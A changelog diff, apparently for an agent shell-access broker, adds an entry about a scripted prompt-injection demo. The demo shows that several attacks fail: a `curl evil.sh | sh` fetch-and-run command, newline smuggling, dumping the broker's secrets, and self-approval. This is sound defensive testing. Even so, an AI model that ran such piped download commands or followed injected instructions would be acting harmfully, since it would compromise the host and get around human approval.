@@ -89,6 +89,15 @@
   file accepts JSONC on load, every rewrite path preserves comments, and the
   examples demonstrate the canonical style (legacy `_*` comment keys still load,
   deprecated).
+- **Prompt-injection live-fire demo (#135)** — the compose demo gains a
+  `control-plane` service and the `demo` host a `shell_parse` allowlist +
+  `require_approval` policy, and a new `examples/compose/prompt-injection-demo.sh`
+  runs a deterministic, scripted (not a live LLM) adversarial sequence that shows
+  every attack failing and names the control that stops it, on the one-shot
+  force-command path: `curl evil.sh | sh` (shell_parse splits the pipe), newline
+  smuggling (control-char rejection), "dump the broker" (distroless, no CA key —
+  nothing to exfiltrate), and self-approval (four-eyes). Brings the stack up,
+  asserts, and tears down — CI-gatable.
 
 ### Changed
 - **Per-agent action-budgets framing (#123)** — the README and
